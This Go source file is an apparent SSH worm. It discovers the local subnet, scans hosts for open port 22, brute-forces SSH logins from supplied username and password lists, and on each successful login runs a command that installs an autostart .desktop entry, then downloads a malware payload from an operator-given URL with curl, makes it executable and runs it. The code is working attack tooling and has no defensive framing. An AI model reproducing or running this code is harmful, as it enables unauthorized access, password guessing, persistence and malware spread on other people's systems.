package main

import (
	"net/http"
	"fmt"
	"os/exec"
	"encoding/json"
	"io/ioutil"
	"strings"
	"strconv"
	"regexp"
	"net"
	"golang.org/x/crypto/ssh"
	"time"
	"os"
	"flag"
)


// gathers list of targets
func getHosts(ipAddress string, cidrNotation string) []string {
	targetList := []string{}
	url := "http://networkcalc.com/api/ip/" + ipAddress + "/" + cidrNotation
	response, _ := http.Get(url)
	responseBody, _ := ioutil.ReadAll(response.Body)
	responseJson := make(map[string]interface{})
	_ = json.Unmarshal([]byte(string(responseBody)), &responseJson)
	address := responseJson["address"].(map[string]interface{})
	firstHost := address["first_assignable_host"].(string)
	lastHost := address["last_assignable_host"].(string)
	firstHostSplit := strings.Split(firstHost, ".")
	lastHostSplit := strings.Split(lastHost, ".")
	// grab  
	lastHostInt, _ := strconv.Atoi(lastHostSplit[len(lastHostSplit)-1])
	// loop through from host 1 to the last assignable host in order to get all possible hosts in the network
	for host:=1; host <= lastHostInt; host++ {
		hostStr := strconv.Itoa(host)
		firstHostSplit[len(lastHostSplit)-1] = hostStr
		target := firstHostSplit[0] + "." + firstHostSplit[1] + "." + firstHostSplit[2] + "." + firstHostSplit[3]
		targetList = append(targetList, target)
	}
	return targetList
}

// attempts to connect to port 22. if successful, we add it to list of targets.
func checkSSHPort() []string {
	// get local IP address then calculate all the potential targets in the subnet
	localIPAddress := getLocalIPAddress()
	fmt.Println("[+] Local IP address:", localIPAddress)
	localIPAddressSplit := strings.Split(localIPAddress, "/")
	potentialTargets := getHosts(localIPAddressSplit[0], localIPAddressSplit[1])
	validTargets := []string{}
	for _, pTarget := range potentialTargets {
		hostPort := pTarget + ":22"
		_, err := net.Dial("tcp", hostPort)
		if err != nil {
			fmt.Println("Host is inaccessible:", hostPort)
		} else {
			fmt.Println("Host is accessible:", hostPort)
			validTargets = append(validTargets, pTarget)
		}

	}
	return validTargets
}

// read input files
func reader(path string) []string {
	fileData, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		empty := []string{}
		return empty
	}
	fileDataSplit := strings.Split(string(fileData), "\n")
	return fileDataSplit
}

// brute force function
func letMeIn(username string, password string, IPAddr string, URL string) {
	hostPort := IPAddr + ":22"
	config := &ssh.ClientConfig{
		User:username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:	5 * time.Second,

	}
	client, err := ssh.Dial("tcp", hostPort, config)
	// if credentials fail & we cannot dial into target, we simply exit out of function
	if err != nil {
		fmt.Println("Unable to authenticate with " + username + ":" + password + " to " + IPAddr)
		return
	}
	fmt.Println("[+] Successful connection! Authenticated to " + IPAddr + " with " + username + ":" + password)
	session, err := client.NewSession()
	if err != nil {
		fmt.Println(err)
	}
	session.Stdout = os.Stdout
	session.Stderr = os.Stderr
	// establishes persistence by creating a desktop app & storing it inside ~/.config/autostart. This will point to our malware
	// command will:
		// 1. We create the autostart directory & a services directory (we will store the malware in the services directory)
		// 2. We create the .desktop app and put it inside the autostart directory
		// 3. We then grab the malware and put it inside the services directory
	command := "mkdir ~/.config && mkdir ~/.config/autostart && mkdir ~/.config/services && echo $'[Desktop Entry]\nType=Application\nName=Services\nExec=sh -c \"$HOME/.config/services/userservice\"\nStartupNotify=false\nTerminal=false' > ~/.config/autostart/Services.desktop && curl " + URL + " > ~/.config/services/userservice && chmod +x ~/.config/services/userservice && ~/.config/services/userservice"
	_ = session.Run(command)
	session.Close()
	client.Close()
}


func getLocalIPAddress() string {
	// grep inet but exclude ipv6 addresses
	// cmd -  "ip addr | grep inet | grep -v inet6"
	cmd := "ip addr | grep inet | grep -v inet6"
	cmdOut, _ := exec.Command("bash", "-c", cmd).Output()
	regexPattern, _:= regexp.Compile("(?:\\d{1,3}\\.){3}\\d{1,3}(?:/\\d\\d?)?")
	matches := regexPattern.FindAllString(string(cmdOut), -1)
	for _, match := range matches {
		// if the regex match doesn't have 127.0.0.1 as a prefix & contains /, we assume it's the appropriate local IP address in cidr notation
		if strings.HasPrefix(match, "127.0.0.1") != true && strings.Contains(match, "/") == true {
			return match
		}

	}
	return ""
}



func main() {
	// getting & reading usernames & passwords from files
	var userPath, passPath, url string
	flag.StringVar(&userPath, "user", "", "path to the user list")
	flag.StringVar(&passPath, "pass", "", "path to the pass list")
	flag.StringVar(&url, "url", "", "URL to the malware to drop & run once access is gained")
	flag.Parse()
	if len(userPath) == 0 || len(passPath) == 0 || len(url) == 0 {
		fmt.Println("You must pass a full path to a username file & password file to the user & pass flags!")
		return
	}
	userList := reader(userPath)
	passList := reader(passPath)
	if len(userList) == 0 || len(passList) == 0 {
		fmt.Println("There are either no passwords or usernames supplied!")
		return
	}

	// gathering a list of local targets
	targets := checkSSHPort()
	for _, target := range targets {
		for _, username := range userList {
			for _, password := range passList {
				// prevent attempts to authenticate with blank username or blank passwords
				if len(username) != 0 && len(password) != 0 {
					fmt.Println("Trying " + username + ":" + password + " for " + target)
					letMeIn(username, password, target, url)
				}
			}
		}
	}
}
